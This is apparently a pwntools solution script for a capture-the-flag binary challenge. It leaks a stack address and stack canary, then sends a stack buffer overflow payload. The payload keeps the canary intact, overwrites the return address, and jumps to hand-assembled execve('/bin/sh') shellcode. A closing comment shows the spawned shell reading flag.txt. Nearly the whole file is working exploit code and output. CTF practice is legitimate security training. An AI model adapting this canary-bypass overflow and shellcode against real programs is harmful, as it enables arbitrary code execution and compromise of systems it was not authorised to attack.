from pwn import * 


#p = remote("chal.firebird.sh", 35026)
p = process("./program")
context.arch = 'amd64'
'''
p.recvuntil(b"                       ")
print(f"Output before address: {output}")
UwU_addr = int(p.recvuntil(b" ").strip(), 16)
print(UwU_addr)

shellcode = asm("""
mov rax, 0x68732f6e69622f
push rax
mov rdi, rsp
mov rsi, 0
mov rdx, 0
mov rax, 0x3b
syscall
""")   

shellcode = asm(shellcraft.amd64.linux.sh())
'''

s = 'b * UwU_main+404'
gdb.attach(p, s)

#output = p.recvuntil(b"0x")
p.recvuntil(b"0x")
UwU_addr = int(b'0x' + p.recvuntil(b' ', drop = True), 16)
#address_line = p.recvline().strip()
#UwU_addr = int(b"0x" + address_line.split(b" ")[0], 16)
#output = p.recvuntil(b"0x")
#address_line = p.recvline().strip()
#canary = int(b"0x" + address_line.split(b" ")[0], 16)
p.recvuntil(b"0x")
canary = int(b'0x' + p.recvuntil(b' ', drop = True), 16)

#shellcode = asm(shellcraft.amd64.linux.sh())
shellcode = asm("""
mov rax, 0x68732f6e69622f
push rax
mov rdi, rsp
xor rsi, rsi
xor rdx, rdx
mov rax, 0x3b
syscall
""")   
shellcode_addr = UwU_addr + 0x18 + 24 # first set to the start of the remaining 16 bytes after return address

payload = b'A' * 24 # to where the canary is 
payload += p64(canary) # up to rbp now
payload += b'B' * 8 # 8 more bytes to the return address 
payload += p64(shellcode_addr) # overwritting return address

# sehllcode placed after return address 
payload += shellcode



p.recvuntil(b"you pass!")
p.sendline(payload)
p.interactive()


'''
Thank you for your cooperation!
$ ls
UwUShell
flag.txt
$ file UwUShell
sh: 2: file: not found
$ file flag.txt
sh: 3: file: not found
$ cat flag.txt
flag{m1d73rm_15_c0m1n6!h4n6_0n_UwU}$ 
'''